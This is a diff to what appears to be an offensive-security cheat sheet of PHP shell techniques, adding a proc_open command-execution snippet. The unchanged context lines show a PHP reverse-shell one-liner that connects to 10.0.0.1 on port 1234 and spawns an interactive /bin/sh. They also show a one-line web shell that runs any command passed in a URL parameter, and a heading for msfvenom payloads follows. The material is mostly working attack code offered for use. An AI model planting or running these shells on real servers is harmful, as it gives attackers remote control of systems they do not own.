@@ -379,6 +379,24 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php system($_GET["cmd"]);?>
 ```
 
+### Command Execution with ``proc_open``
+```
+<?php
+
+$cwd='/tmp';
+$descriptorspec = array(
+    0 => array("pipe", "r"),
+    1 => array("pipe", "w"),
+    2 => array("file", "/tmp/error-output.txt", "a") );
+$process = proc_open("whoami", $descriptorspec, $pipes, $cwd);
+
+echo stream_get_contents($pipes[1]);
+fclose($pipes[1]);
+
+?>
+
+```
+
  
 ## Using msfvenom 
 ```
